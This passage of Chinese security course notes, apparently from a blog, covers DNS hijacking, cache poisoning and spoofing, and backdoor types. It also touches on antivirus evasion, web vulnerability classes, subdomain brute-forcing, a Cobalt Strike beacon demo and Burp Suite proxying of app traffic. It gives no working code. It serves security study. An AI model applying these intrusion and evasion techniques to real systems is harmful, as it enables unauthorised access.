利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。其实现方式有多种，比如可以通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者，黑客通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。 3)DDOS攻击 一种攻击针对DNS服务器软件本身，通常利用BIND软件程序中的漏洞，导致DNS服务器崩溃或拒绝服务;另一种攻击的目标不是DNS服务器，而是利用DNS服务器作为中间的“攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。 DNS欺骗 DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。 脚本语言常见的脚本语言类型有哪些？脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常以文本（如ASCII)保存，只在被调用时进行解释或编译。Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等 不同脚本类型与安全漏洞的关系？不同的脚本语言决定了安全漏洞的多少。 漏洞挖掘代码审计与脚本类型的关系？同上 后门什么是后门？有那些后门？后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。根据实现方式的不同，可以将后门分为网页后门、线程插入后门、扩展后门、C/S 后门和账户后门等类型。 后门在安全测试中的实际意义？(1)方便下次更方便的进来。 (2)获取到相关权限之后，后门相当于一个管道，便于操作。 关于后门需要了解那些？（玩法，免杀）免杀，就是绕过杀毒软件的防护，避免被检测到。 WEBWEB 的组成架构模型？网站源码：分脚本类型，分应用方向操作系统：windows linux中间件（搭建平台）：apache iis tomcat nginx 等数据库：access mysql mssql oracle sybase db2 postsql 等 架构漏洞安全测试简要介绍？web网站-数据库权限-权限提升-内网。 为什么要从 WEB 层面为主为首？不管是PC还是APP本质上都可以以web为突破口。 WEB相关安全漏洞WEB 源码类对应漏洞1234567SQL 注入文件上传XSS代码执行变量覆盖逻辑漏洞反序列化等 WEB 中间件对应漏洞未授权访问等等 WEB 数据库对应漏洞弱口令等 WEB 系统层对应漏洞提权相关的 其他第三方对应漏洞第三方软件的一些漏洞 eg:QQ APP 或 PC 应用结合类 App或者PC软件的漏洞 演示案例多级域名的枚举查找1.直接百度 2.通过工具进行爆破 这里我使用的是Layer子域名爆破工具，下载链接是https://github.com/euphrat1ca/LayerDomainFinder，字典是https://github.com/k8gege/PasswordDic。 3.域名注册 查询A记录、MX记录、C记录 DNS解析修改后分析（本地或服务）前面有实验过，这里就不弄了。 EXE 后门功能及危害及类似 WEB 后门这里因为没有视频中的软件，所有我这里使用的是CS，进行上线。 关于CS具体操作可以看https://soapffz.com/sec/483.html 可以看到成功上线了。 APP类结合WEB协议，PC类结合WEB协议手机模拟器 需要设置代理，代理ip为PC端ip。 PC端需要通过burp suite进行抓包，设置brup监听端口为代理服务器端口。 之后修改数据包，修改电脑数据包和手机端一致，从app分离出WEB 测试漏洞。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}],"categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"文件包含","slug":"文件包含","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"代码执行","slug":"代码执行","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"命令执行","slug":"命令执行","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}